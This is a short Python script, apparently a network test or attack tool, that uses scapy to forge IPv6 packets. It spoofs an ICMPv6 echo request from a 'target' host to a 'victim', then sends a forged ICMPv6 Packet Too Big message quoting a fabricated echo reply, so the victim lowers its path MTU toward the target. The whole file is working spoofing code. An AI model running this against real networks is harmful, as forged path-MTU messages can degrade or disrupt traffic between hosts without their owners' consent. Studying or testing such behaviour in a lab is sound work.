import argparse
import os
import time
import scapy.all as sp
import scapy.layers.inet6 as inet6

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--iface')
parser.add_argument('--hlim', type=int, default=64)
parser.add_argument('mtu', type=int)
parser.add_argument('victim')
parser.add_argument('target')
args = parser.parse_args()
iface = args.iface
hlim = args.hlim
mtu = args.mtu
victim = args.victim
target = args.target

if iface:
    sp.conf.iface = iface

victim_mac = sp.getmacbyip6(victim)
target_mac = sp.getmacbyip6(target)

pid = os.getpid()
eid = (pid >> 16) & 0xffff
seq = pid & 0xffff

p = sp.Ether(src=target_mac, dst=victim_mac) / \
    inet6.IPv6(src=target, dst=victim) / \
    inet6.ICMPv6EchoRequest(id=eid, seq=seq, data=(b'\x00' * (mtu - 47)))
sp.sendp(p, verbose=0)

time.sleep(0.05)

pe = inet6.IPv6(src=victim, dst=target, hlim=hlim) / \
    inet6.ICMPv6EchoReply(id=eid, seq=seq, data=(b'\x00' * (mtu - 48)))
p = sp.Ether(src=target_mac, dst=victim_mac) / \
    inet6.IPv6(src=target, dst=victim) / \
    inet6.ICMPv6PacketTooBig(mtu=mtu) / \
    sp.raw(pe)
sp.sendp(p, verbose=0)
